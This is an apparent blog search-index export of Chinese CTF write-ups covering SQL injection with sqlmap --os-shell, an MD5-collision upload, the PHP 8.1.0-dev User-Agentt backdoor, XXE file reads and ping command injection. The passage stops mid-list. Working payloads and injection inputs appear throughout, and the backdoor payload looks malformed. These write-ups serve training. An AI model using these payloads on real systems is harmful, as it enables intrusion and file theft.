<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>青少年CTF擂台挑战赛 2024 Round 1 【Web复现】</title>
    <link href="/2024/03/03/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E6%93%82%E5%8F%B0%E6%8C%91%E6%88%98%E8%B5%9B-2024-Round-1-%E3%80%90Web%E5%A4%8D%E7%8E%B0%E3%80%91/"/>
    <url>/2024/03/03/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E6%93%82%E5%8F%B0%E6%8C%91%E6%88%98%E8%B5%9B-2024-Round-1-%E3%80%90Web%E5%A4%8D%E7%8E%B0%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h3 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h3><p>打开是登录界面，随便输入账号密码为admin，admin</p><p><img src="/img/qsnctf/ezsql01.png"></p><p>发现为POST传参，用SQLmap跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;http://challenge.qsnctf.com:31206/login.php&quot; --data=&quot;psw=admin&amp;uname=admin&quot;<br></code></pre></td></tr></table></figure><p>发现为时间盲注</p><p><img src="/img/qsnctf/ezsql02.png"></p><p><img src="/img/qsnctf/ezsql03.png"></p><p>用SQLmap执行shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;http://challenge.qsnctf.com:31206/login.php&quot; --data=&quot;psw=admin&amp;uname=admin&quot; --os-shell<br></code></pre></td></tr></table></figure><p>接下来的思路与<a href="http://t.csdnimg.cn/KgjDL">【Web】青少年CTF练习平台-文章管理系统</a>一样</p><p><img src="/img/qsnctf/ezsql04.png"></p><h3 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h3><p>打开随便上传两个<code>.pdf</code>尾缀文件</p><p><img src="/img/qsnctf/md501.png"></p><p>放在BP重放器里查看，提示”MD5碰撞“</p><p><img src="/img/qsnctf/md501.5.png"></p><p><img src="/img/qsnctf/md502.png"></p><p>于是用<code>fastcoll</code>进行MD5碰撞</p><p><img src="/img/qsnctf/md503.png"></p><p><img src="/img/qsnctf/md504.png"></p><p>再次上传<code>.pdf</code>文件，在BP重放器里查看，得到FLAG</p><p><img src="/img/qsnctf/md505.png"></p><h3 id="PHP的后门"><a href="#PHP的后门" class="headerlink" title="PHP的后门"></a>PHP的后门</h3><p>打开询问网站PHP的版本，通过响应头得知版本为<code>PHP/8.1.0-dev</code></p><p><img src="/img/qsnctf/phphm01.png"></p><p><strong>通过搜索引擎查找<a href="http://t.csdnimg.cn/F7Z4O">博客</a>得知：</strong><code>PHP verion 8.1.0-dev</code>于2021年3月28日被植入后门，但是后门很快被发现并删除。当受害者使用该后门PHP代码时，攻击者可以通过修改User-Agent头来执行任意代码。</p><p>于是通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">User-Agentt: zerodiumfile_put_contents(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>得到FLAG</p><p><img src="/img/qsnctf/phphm02.png"></p><h3 id="PHP的XXE"><a href="#PHP的XXE" class="headerlink" title="PHP的XXE"></a>PHP的XXE</h3><p>打开为<code>phpinfo()</code></p><p><img src="/img/qsnctf/xxe01.png"></p><p>访问主页，发现<strong>libxml版本低于2.9.0</strong></p><p><img src="/img/qsnctf/xxe02.png"></p><p>目录下有dom.php、index.php、SimpleXMLElement.php、simplexml_load_string.php其中dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞。</p><p><img src="/img/qsnctf/xxe03.png"></p><p><img src="/img/qsnctf/xxe04.png"></p><p>参考典型攻击如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> # XML声明，表明了版本以及编码方式<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[ # 内部DTD</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">test</span> <span class="hljs-keyword">ANY</span> &gt;</span># 声明了一个约束元素，任何内容都可以</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span># 一个内部实体，名字是xxe<br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span># XML部分，对实体的引用<br><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">test</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>放入BP重放器，得到FLAG</p><p><img src="/img/qsnctf/xxe05.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防日志 WP</title>
    <link href="/2024/01/23/%E6%94%BB%E9%98%B2%E6%97%A5%E5%BF%97-WP/"/>
    <url>/2024/01/23/%E6%94%BB%E9%98%B2%E6%97%A5%E5%BF%97-WP/</url>
    
    <content type="html"><![CDATA[<p><strong>简单做个笔记</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p><strong>题目</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">小宁写了个<span class="hljs-built_in">ping</span>功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br></code></pre></td></tr></table></figure><p><img src="/img/GFSJ/gf_001.png"></p><p><strong>考点</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">RCE之命令注入<br></code></pre></td></tr></table></figure><p><strong>法一</strong></p><p><code>;ls /</code></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stata">ping -c 3 ;<span class="hljs-keyword">ls</span> /<br>bin<br><span class="hljs-keyword">boot</span><br>dev<br>etc<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br><span class="hljs-keyword">run</span><br><span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span><br>sbin<br>srv<br>sys<br>tmp<br>usr<br><span class="hljs-keyword">var</span><br></code></pre></td></tr></table></figure><p>依次打开目录查看，在<code>home</code>目录发现<code>flag.txt</code></p><p><code>;ls /home</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 3 ;<span class="hljs-built_in">ls</span> /home<br>flag.txt<br></code></pre></td></tr></table></figure><p><code>;cat /home/flag.txt</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ping -<span class="hljs-keyword">c</span> <span class="hljs-number">3</span> <span class="hljs-comment">;cat /home/flag.txt</span><br>cyberpeace&#123;<span class="hljs-keyword">c</span><span class="hljs-number">7</span>ca<span class="hljs-number">45569</span>a<span class="hljs-number">1</span>bb<span class="hljs-number">83891</span>dfcfd<span class="hljs-number">28e155</span>d<span class="hljs-number">7</span>e&#125;<br></code></pre></td></tr></table></figure><p><strong>法二</strong></p><p>通过查找函数，函数有全局查找函数<code>find</code></p><p><code>127.0.0.1;find / -name &quot;flag*&quot;</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ping -c <span class="hljs-number">3</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<span class="hljs-keyword">find</span> / -name <span class="hljs-string">&quot;flag*&quot;</span><br>PING <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) bytes of data.<br><span class="hljs-number">64</span> bytes <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.014</span> ms<br><span class="hljs-number">64</span> bytes <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>: icmp_seq=<span class="hljs-number">2</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.036</span> ms<br><span class="hljs-number">64</span> bytes <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>: icmp_seq=<span class="hljs-number">3</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.036</span> ms<br><br>--- <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> ping statistics ---<br><span class="hljs-number">3</span> packets transmitted, <span class="hljs-number">3</span> received, <span class="hljs-number">0</span>% packet loss, time <span class="hljs-number">2043</span>ms<br>rtt min<span class="hljs-regexp">/avg/m</span>ax<span class="hljs-regexp">/mdev = 0.014/</span><span class="hljs-number">0.028</span><span class="hljs-regexp">/0.036/</span><span class="hljs-number">0.012</span> ms<br><span class="hljs-regexp">/home/</span>flag.txt<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS15/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS6/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS23/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS13/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS31/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS4/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS21/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS11/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS2/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS28/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS0/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS18/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS9/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS26/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS16/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS7/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS24/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS14/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS5/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS22/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS12/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS30/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS3/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS20/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS10/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS29/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS1/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS19/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS27/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS17/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS8/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/platform/</span>serial8250<span class="hljs-regexp">/tty/</span>ttyS25/flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/virtual/</span>net<span class="hljs-regexp">/lo/</span>flags<br><span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/virtual/</span>net<span class="hljs-regexp">/eth0/</span>flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu0/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu0/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu1/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu1/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu10/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu10/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu11/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu11/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu12/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu12/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu13/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu13/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu14/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu14/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu15/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu15/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu16/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu16/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu17/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu17/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu18/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu18/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu19/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu19/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu2/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu2/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu20/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu20/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu21/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu21/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu22/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu22/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu23/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu23/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu24/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu24/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu25/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu25/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu26/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu26/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu27/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu27/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu28/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu28/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu29/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu29/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu3/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu3/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu30/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu30/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu31/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu31/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu4/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu4/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu5/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu5/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu6/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu6/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu7/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu7/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu8/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu8/</span>domain1/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu9/</span>domain0/flags<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>sched_domain<span class="hljs-regexp">/cpu9/</span>domain1/flags<br></code></pre></td></tr></table></figure><p>找到文件路径，然后cat，同法一</p><p><strong>小知识点</strong></p><p><strong>（命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符））</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">windows 或 linux 下:<br><span class="hljs-keyword">command</span>1 &amp;&amp; <span class="hljs-keyword">command</span>2 先执行 <span class="hljs-keyword">command</span>1，如果为真，再执行 <span class="hljs-keyword">command</span>2<br><span class="hljs-keyword">command</span>1 || <span class="hljs-keyword">command</span>2 先执行 <span class="hljs-keyword">command</span>1，如果为假，再执行 <span class="hljs-keyword">command</span>2<br><span class="hljs-keyword">command</span>1 &amp; <span class="hljs-keyword">command</span>2 先执行 <span class="hljs-keyword">command</span>2 后执行 <span class="hljs-keyword">command</span>1<br><span class="hljs-keyword">command</span>1 | <span class="hljs-keyword">command</span>2 只执行 <span class="hljs-keyword">command</span>2<br>连接符号：“;” 